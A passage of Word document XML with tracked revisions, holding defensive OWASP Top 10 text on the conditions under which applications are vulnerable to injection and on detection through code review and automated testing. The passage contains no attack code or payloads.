    <w:p w14:paraId="52064788" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55F307AB" w14:textId="7F09B528" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1120" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1121" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1122" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> User-supplied data is not validated, filtered, or sanitized by the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677A0E19" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1123" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507BD343" w14:textId="3277BB8A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1124" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1125" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="396486AF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1126" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1127" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Dynamic queries or non-parameterized calls without context-aware</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608FBD24" w14:textId="36626849" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1128" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> escaping </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> used directly in the interpreter.</w:t>
      </w:r>
      <w:del w:id="1129" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">  </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0557F88E" w14:textId="78479979" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1130" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1131" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1AE71756" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1132" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1133" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Hostile data is used within object-relational mapping (ORM) search</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E76F71D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1134" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> parameters to extract additional, sensitive records.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F2E835" w14:textId="6DD7B8CE" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1135" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1136" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="15C2F679" w14:textId="07D9AECD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1137" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1138" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Hostile data is directly used or concatenated</w:t>
      </w:r>
      <w:del w:id="1139" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">, such that the </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1140" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">. The </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SQL or command</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="737642CA" w14:textId="1C1F05A0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1141" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1142" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> contains </w:t>
      </w:r>
      <w:del w:id="1143" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>both</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1144" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>the</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> structure and </w:t>
      </w:r>
      <w:del w:id="1145" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>hostile</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1146" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>malicious</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> data in dynamic queries,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AED407D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1147" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> commands, or stored procedures.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACFADB1" w14:textId="6D279261" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1148" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1149" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">* </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2C470E35" w14:textId="2227897A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1150" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Some of the more common injections are SQL, NoSQL, OS command, Object</w:t>
      </w:r>
      <w:del w:id="1151" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3CF8D5DB" w14:textId="61D1D912" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1152" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Relational Mapping (ORM), LDAP, and Expression Language (EL) or Object</w:t>
      </w:r>
      <w:del w:id="1153" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3130FACA" w14:textId="4A8179E1" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1154" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Graph Navigation Library (OGNL) injection. The concept is identical</w:t>
      </w:r>
      <w:del w:id="1155" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3F11F51E" w14:textId="642D8D9E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1156" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>among all interpreters. Source code review is the best method of</w:t>
      </w:r>
      <w:del w:id="1157" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2EF562A8" w14:textId="429EE148" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1158" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>detecting if applications are vulnerable to injections</w:t>
      </w:r>
      <w:del w:id="1159" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">, closely followed by thorough automated </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1160" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>. Automated</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="16D689F2" w14:textId="64355CCC" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1161" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>testing of all parameters, headers, URL, cookies, JSON, SOAP, and XML</w:t>
      </w:r>
      <w:del w:id="1162" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3F76C442" w14:textId="2633CE37" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1163" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>data inputs</w:t>
      </w:r>
      <w:del w:id="1164" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1165" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> is strongly encouraged.</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Organizations can include</w:t>
      </w:r>
      <w:del w:id="1166" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4A53EC6C" w14:textId="0315F8C8" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1167" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">static </w:t>
      </w:r>
      <w:del w:id="1168" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>source ([</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1169" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SAST</w:t>
      </w:r>
      <w:del w:id="1170" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003A6212" w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">](https://www.owasp.org/index.php/Source_Code_Analysis_Tools)) and </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1171" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">), </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
